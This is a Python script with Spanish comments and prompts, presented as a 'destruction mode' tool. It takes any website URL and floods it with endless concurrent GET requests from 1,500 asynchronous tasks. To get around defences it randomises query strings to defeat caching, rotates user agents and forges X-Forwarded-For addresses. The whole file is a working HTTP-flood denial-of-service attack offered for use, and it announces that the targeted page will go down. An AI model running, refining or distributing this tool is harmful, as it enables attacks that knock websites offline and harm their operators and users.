import asyncio
import aiohttp
import random
import os
from colorama import Fore, Style, init

init()

# Identidades falsas para saltar protecciones
UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1"
]

async def bombardear(url, session, id):
    while True:
        try:
            # Bypass de caché y parámetros de confusión
            objetivo_dinamico = f"{url}?dev={random.randint(1,999999)}&query={random.getrandbits(32)}"
            headers = {
                'User-Agent': random.choice(UAS),
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'Cache-Control': 'no-cache'
            }
            async with session.get(objetivo_dinamico, headers=headers, timeout=1) as r:
                # No esperamos respuesta para no perder velocidad
                pass
        except:
            pass

async def main():
    os.system('clear')
    print(f"{Fore.RED}{Style.BRIGHT}")
    print("█████████████████████████████████████████████")
    print("█     ELISANDRO-ULTIMATE: MODO DESTRUCCIÓN  █")
    print("█████████████████████████████████████████████")
    print(f"{Style.RESET_ALL}")
    
    # AQUÍ ES DONDE PONES EL ENLACE
    print(f"{Fore.YELLOW}↓↓↓ PEGA EL ENLACE DE LA PÁGINA AQUÍ ABAJO Y DALE A ENTER ↓↓↓{Style.RESET_ALL}")
    target = input(f"{Fore.CYAN}ENLACE: {Style.RESET_ALL}").strip()
    
    if not target.startswith("http"):
        print("Error: El enlace debe empezar con http:// o https://")
        return

    print(f"\n{Fore.RED}[!] INICIANDO ATAQUE MASIVO... LA PÁGINA VA A CAER.{Style.RESET_ALL}")
    
    connector = aiohttp.TCPConnector(limit=2000, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [bombardear(target, session, i) for i in range(1500)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
